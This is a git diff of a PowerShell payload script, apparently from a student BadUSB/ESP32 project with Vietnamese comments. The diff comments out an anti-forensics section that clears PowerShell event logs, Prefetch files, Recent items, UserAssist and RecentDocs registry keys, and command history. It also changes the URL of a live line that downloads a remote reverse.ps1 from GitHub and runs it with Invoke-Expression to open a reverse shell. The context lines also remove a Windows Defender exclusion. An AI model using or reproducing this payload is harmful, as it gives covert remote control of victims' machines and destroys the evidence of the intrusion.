@@ -237,59 +237,59 @@ Set-Location "C:\"
 Remove-Item -Path $basePath -Recurse -Force -ErrorAction SilentlyContinue
 Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
 
-# ============================================
-# XÓA DẤU VẾT NÂNG CAO
-# ============================================
+# # ============================================
+# # XÓA DẤU VẾT NÂNG CAO
+# # ============================================
 
-# 1. Xóa Event Logs PowerShell
-try {
-    wevtutil cl "Windows PowerShell" 2>$null
-    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-    wevtutil cl "Microsoft-Windows-PowerShell/Admin" 2>$null
-} catch {}
+# # 1. Xóa Event Logs PowerShell
+# try {
+#     wevtutil cl "Windows PowerShell" 2>$null
+#     wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+#     wevtutil cl "Microsoft-Windows-PowerShell/Admin" 2>$null
+# } catch {}
 
-# 2. Xóa Prefetch files của PowerShell
-try {
-    Get-ChildItem "C:\Windows\Prefetch\*POWERSHELL*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force
-    Get-ChildItem "C:\Windows\Prefetch\*POWERSHELL*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force
-} catch {}
+# # 2. Xóa Prefetch files của PowerShell
+# try {
+#     Get-ChildItem "C:\Windows\Prefetch\*POWERSHELL*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force
+#     Get-ChildItem "C:\Windows\Prefetch\*POWERSHELL*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force
+# } catch {}
 
-# 3. Xóa Recent files
-try {
-    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
-} catch {}
+# # 3. Xóa Recent files
+# try {
+#     Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+# } catch {}
 
-# 4. Xóa UserAssist registry (ghi lại chương trình đã chạy)
-try {
-    $userAssistPaths = @(
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
-        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
-    )
-    foreach ($path in $userAssistPaths) {
-        if (Test-Path $path) {
-            Get-ChildItem -Path $path -Recurse | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-        }
-    }
-} catch {}
+# # 4. Xóa UserAssist registry (ghi lại chương trình đã chạy)
+# try {
+#     $userAssistPaths = @(
+#         "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
+#         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+#     )
+#     foreach ($path in $userAssistPaths) {
+#         if (Test-Path $path) {
+#             Get-ChildItem -Path $path -Recurse | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+#         }
+#     }
+# } catch {}
 
-# 5. Xóa RecentDocs registry
-try {
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Name "*" -Force -ErrorAction SilentlyContinue
-} catch {}
+# # 5. Xóa RecentDocs registry
+# try {
+#     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Name "*" -Force -ErrorAction SilentlyContinue
+# } catch {}
 
-# 6. Clear Console Buffer
-try {
-    Clear-Host
-} catch {}
+# # 6. Clear Console Buffer
+# try {
+#     Clear-Host
+# } catch {}
 
-# 7. Xóa file history của PowerShell (một lần nữa cho chắc)
-try {
-    $historyPath = (Get-PSReadlineOption).HistorySavePath
-    if ($historyPath -and (Test-Path $historyPath)) {
-        Clear-Content $historyPath -Force -ErrorAction SilentlyContinue
-        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
-    }
-} catch {}
+# # 7. Xóa file history của PowerShell (một lần nữa cho chắc)
+# try {
+#     $historyPath = (Get-PSReadlineOption).HistorySavePath
+#     if ($historyPath -and (Test-Path $historyPath)) {
+#         Clear-Content $historyPath -Force -ErrorAction SilentlyContinue
+#         Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
+#     }
+# } catch {}
 
 # ============================================
 # REVERSE SHELL
@@ -300,7 +300,7 @@ try {
 
 try {
     # Tải và chạy reverse.ps1 từ GitHub
-    Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khangpdm/BadUSB/refs/heads/main/reverse.ps1" -UseBasicParsing).Content
+    Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/khangpham/src/reverse.ps1" -UseBasicParsing).Content
 } catch {
     # Nếu không tải được thì chạy trực tiếp
     Write-Host "Cannot load reverse.ps1" -ErrorAction SilentlyContinue
